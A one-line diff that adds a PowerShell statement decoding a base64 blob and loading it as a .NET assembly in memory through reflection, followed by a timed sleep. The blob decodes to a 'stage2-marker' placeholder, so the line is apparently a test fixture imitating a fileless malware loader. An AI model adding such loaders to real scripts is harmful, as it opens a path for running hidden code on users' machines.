@@ -1,0 +1,1 @@
+$AssemblyBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpyaTFjMzlteXFr"); Write-Verbose ("Assembly bytes: " + $AssemblyBytes.Length); [Reflection.Assembly]::Load($AssemblyBytes); Start-Sleep -Seconds 32
